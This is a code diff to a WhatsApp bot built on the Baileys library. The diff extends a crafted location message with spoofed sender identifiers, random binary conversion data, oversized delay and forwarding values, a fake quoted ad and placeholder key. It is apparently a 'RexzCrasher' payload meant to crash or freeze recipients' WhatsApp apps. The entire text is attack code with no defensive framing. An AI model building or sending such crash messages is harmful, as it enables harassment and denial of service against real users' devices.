@@ -7,6 +7,7 @@ import {
   proto
 } from "@whiskeysockets/baileys";
 import ytSearch from 'yt-search';
+import crypto from "crypto";
 import ytdl from 'ytdl-core';
 import chalk from "chalk";
 import axios from 'axios';
@@ -105,11 +106,25 @@ const locationMsg = proto.Message.LocationMessage.fromObject({
   contextInfo: {
     remoteJid: "status@broadcast",
     participant: "0@s.whatsapp.net",
+    conversionSource: "©RexzCrasher🕊️",
+    conversionData: crypto.randomBytes(16),
+    conversionDelaySeconds: 252525,
     stanzaId: "1234567890ABCDEF",
     forwardingScore: 252525,
     isForwarded: true,
     businessMessageForwardInfo: {
-      businessOwnerJid: "13135550002@s.whatsapp.net"
+      businessOwnerJid: "0@s.whatsapp.net"
+    },
+    quotedAd: {
+      advertiserName: "",
+      mediaType: "IMAGE",
+      jpegThumbnail: cihuy,
+      caption: ""
+    },
+    placeholderKey: {
+      remoteJid: "0@s.whatsapp.net",
+      fromMe: false,
+      id: "©RexzCrasher2025"
     },
     mentionedJid: mentionJid(),
     externalAdReply: {
